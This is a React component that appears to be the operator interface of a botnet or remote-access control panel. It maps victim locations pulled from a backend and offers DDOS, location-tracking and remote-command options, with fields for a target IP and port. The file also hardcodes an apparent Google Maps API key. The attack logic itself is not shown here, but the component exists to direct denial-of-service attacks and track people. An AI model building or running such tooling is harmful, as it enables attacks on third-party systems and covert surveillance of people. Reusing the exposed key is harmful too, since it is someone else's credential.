import React, { useEffect, useRef, useState } from 'react';
import "./attack.css"
import axios from 'axios';
import COMMAND from './command';

const GOOGLE_MAP_API_KEY = 'AIzaSyBQiTn-kIN8jRvHrCsclhDjD8QAxf_HSU4';
const googleMapScript = document.createElement("script");
googleMapScript.src = `https://maps.googleapis.com/maps/api/js?key=${GOOGLE_MAP_API_KEY}`;
window.document.body.appendChild(googleMapScript);

const Attack = () => {
  
  const googleMapRef = useRef(null);
  let googleMap = null;
  const [selection , setSelection] = useState("DDOS")
  const [DDOS , setDDOS] = useState(true)
  const [Command , setCommand] = useState(false)
  const [loadMap, setLoadMap] = useState(false);
  // list of icons
  const iconList = {
    icon1: 'https://cdn1.iconfinder.com/data/icons/Map-Markers-Icons-Demo-PNG/256/Map-Marker-Flag--Right-Chartreuse.png',
    icon2: 'https://cdn2.iconfinder.com/data/icons/IconsLandVistaMapMarkersIconsDemo/256/MapMarker_Marker_Outside_Chartreuse.png',
    icon3: 'https://cdn1.iconfinder.com/data/icons/Map-Markers-Icons-Demo-PNG/256/Map-Marker-Ball-Right-Azure.png',
    icon4: 'https://cdn1.iconfinder.com/data/icons/Map-Markers-Icons-Demo-PNG/256/Map-Marker-Marker-Outside-Pink.png'
  }

  // list of the marker object along with icon
  // const markerList = [
  //   { lat: 59.2967322, lng: 18.0009393, icon: iconList.icon1 },
  //   { lat: 59.2980245, lng: 17.9971503, icon: iconList.icon2 },
  //   { lat: 59.2981078, lng: 17.9980875, icon: iconList.icon3 },
  //   { lat: 15.9266657, lng: 107.9650856, icon: iconList.icon4 }
  // ]
  
  // initialize the google map
  const initGoogleMap = () => {
    try {
      return new window.google.maps.Map(googleMapRef.current, {
        center : {lat : 15.9266657 , lng : 107.9650856},
        zoom : 1000000000
      })
    } catch (error) {
      console.log(error)
    }
  }
  
  // create marker on google map
  const createMarker = (markerObj) =>{
    new window.google.maps.Marker({
    position: { lat: markerObj.lat, lng: markerObj.lng },
    map: googleMap,
    icon: {
      url: iconList.icon4,
      // set marker width and height
      scaledSize: new window.google.maps.Size(50, 50)
    }
  })};
  
  useEffect(() => {
    try {
      axios({
        method : "GET",
        url : process.env.REACT_APP_URL + "user/location",
      })
      .then(res => {
        googleMap = initGoogleMap();
        var bounds = new window.google.maps.LatLngBounds();
        res.data.data?.map((x) => {
          try {
            const marker = createMarker(x);
            bounds.extend(marker.position);
          } catch (error) {
            return 0
          }
        });
        googleMap.fitBounds(bounds); // the map to contain all markers
        setLoadMap(false)
      })
      .catch(err => {
        return 0
      })
    } catch (error) {
      setLoadMap(true)
    }
  }, []);

  const handle_selection = () => {
    if (selection === "DDOS") {
      setDDOS(true)
      setCommand(false)
    }else if (selection === "COMMAND") {
      setDDOS(false)
      setCommand(true)
    }
    else {
      setDDOS(false)
    }
  }


  return (
    <>
      <div  className='google-map'>
        {loadMap ? <h2 style={{color : "red"}}>error when loading maps please try again :((</h2> : <div
          ref={googleMapRef}
          className='google-map1'
        />}
      </div>
      <div className='command_select'>
        <h2 style={{width : "100%" , height : 30}}>ATTACK COMMAND</h2>
        <div className='wrapper_select'>
          <select value={selection} className='attack_select' onChange={(e) => {
            setSelection(e.target.value)
          }}>
            <option value={"DDOS"}>
              DDOS
            </option>
            <option value={"TRACK_LOCATION"}>
              TRACK LOCATION
            </option>
            <option value={"COMMAND"}>
              COMMAND
            </option>
          </select>
          <button className='btn-select-attack' onClick={handle_selection}>select</button>
        </div>
      </div>
      <div className='handle-select'>
          {DDOS && <div
            className='header_attack'
            >
              <h1 style={{width : "100%"}}>DDOS</h1>
              <div className='zwaizig'>
                <span style={{marginRight : 20}}>IP TARGET </span>
                <input type='text' name="ip" className='ip_address_target' placeholder='ip target ...' />
              </div>
              <div className='dreiBig'>
                <span>PORT TARGET  </span>
                <input type='text' name="port" className='port_target' placeholder='port target ...' /></div>
              <div className='start-stop'>
                <button className='btn_start'>Start</button>
                <button className='btn_stop'>Stop</button>
              </div>
              <div className='show_process_result'></div>
            </div>}
            {Command && <COMMAND />}
      </div>
    </>
  )
}

export default Attack;